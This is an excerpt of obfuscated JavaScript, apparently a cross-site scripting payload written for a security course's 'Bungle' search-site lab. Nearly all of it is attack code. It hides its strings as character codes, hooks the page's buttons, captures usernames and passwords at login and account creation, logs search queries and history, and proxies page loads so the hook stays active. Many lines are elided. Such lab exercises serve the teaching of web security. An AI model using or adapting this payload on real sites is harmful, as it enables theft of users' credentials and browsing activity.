...
function payload(attacker) {
	...
	function inject_bad_stuff(){
		...
		$(String.fromCharCode(35,115,101,97,114,99,104,45,98,116,110)).click( function(){
				...
				record({
					 str_action: String.fromCharCode(115,101,97,114,99,104), 
					 str_data: $(String.fromCharCode(35,113,117,101,114,121)).val()
				})
		...
		$(String.fromCharCode(35,98,117,110,103,108,101,45,108,110,107)).click( function(e){
				...
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					str_action: String.fromCharCode(104,111,109,101)
				})
		...
		$(String.fromCharCode(35,115,101,97,114,99,104,45,97,103,97,105,110,45,98,116,110)).click( function(){
				...
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					str_action: String.fromCharCode(114,101,115,101,97,114,99,104)
				})
				proxy(String.fromCharCode(46,47))
			}
		)
		...
		$(String.fromCharCode(35,110,101,119,45,97,99,99,111,117,110,116,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					str_action: String.fromCharCode(99,114,101,97,116,101,95,97,99,99,111,117,110,116),
					str_user: $(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(),
					str_password: $(String.fromCharCode(35,117,115,101,114,112,97,115,115)).val()
				})
				proxy(String.fromCharCode(46,47,99,114,101,97,116,101), {
					str_username:$(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(), 
					str_password:$(String.fromCharCode(117,115,101,114,112,97,115,115)).val()
				})
			}
		)
		...
		$(String.fromCharCode(35,108,111,103,45,105,110,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					str_action: String.fromCharCode(108,111,103,105,110),
					str_user: $(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(),
					str_password: $(String.fromCharCode(35,117,115,101,114,112,97,115,115)).val()
				})
		...
		$(String.fromCharCode(35,108,111,103,45,111,117,116,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					str_action: String.fromCharCode(108,111,103,111,117,116)
				})
			    ...
			    if ( $(this).text().includes(String.fromCharCode(102,111,114,95,102,117,110,95,116,97,103))) $(this).hide();
			    	...
			    	$(this).click(
			    		function(e){
			    			e.preventDefault();
			    			record({
								str_action: String.fromCharCode(115,101,97,114,99,104,95,104,105,115,116,111,114,121), 
								str_data: s
							})
